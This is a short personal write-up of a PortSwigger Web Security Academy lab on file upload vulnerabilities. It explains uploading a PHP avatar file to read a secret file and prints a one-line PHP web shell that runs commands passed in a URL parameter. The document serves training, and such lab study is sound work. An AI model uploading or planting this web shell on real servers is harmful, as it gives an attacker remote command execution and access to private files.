
#portswigger #solution #sqli

- **Category:** [[File upload vulnerabilities]]
- **Difficulty:** [[Apprentice]]
- **URL Lab:** https://portswigger.net/web-security/learning-paths/file-upload-vulnerabilities
- **Date Solved:** 2026-08-02

---

## 🎯 1. Lab Objective
>Upload a basic PHP web shell and use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.

---

## 🔍 2. Reconnaissance & Vulnerability Analysis

This lab contains a vulnerable image upload function. It attempts to prevent users from uploading unexpected file types, but relies on checking user-controllable input to verify this.

==note: content-type header==
application/x-www-form-urlencoded : simple text files
multipart/form-data : PDF or Image files (large amount of binary data)

---

## 🚀 3. Exploitation

1. **Step 1:** Sign in using the given credentials.
![[Pasted image 20260802155432.png]]
2. **Step 2:** Upload a simple PHP file into the Avatar Upload section to gain the system's control
```php
<?php echo system($_GET['command']); ?>
```
1. **Step 3:** Once gained the control. Change the parameter of 'command' into whatever command we want!
![[Pasted image 20260802154825.png]]
---

## ⚡ 4. PoC / Final Payload

```php
<?php echo system($_GET['command']); ?>
```
---
## 💡 5. Key Takeaways & Remediation

- **Key Concept:** Upload a malicious PHP script into the 'Avatar Upload' section to gain the system's control
- **Remediation:** [[Preventing File Upload Vulnerabilities]]
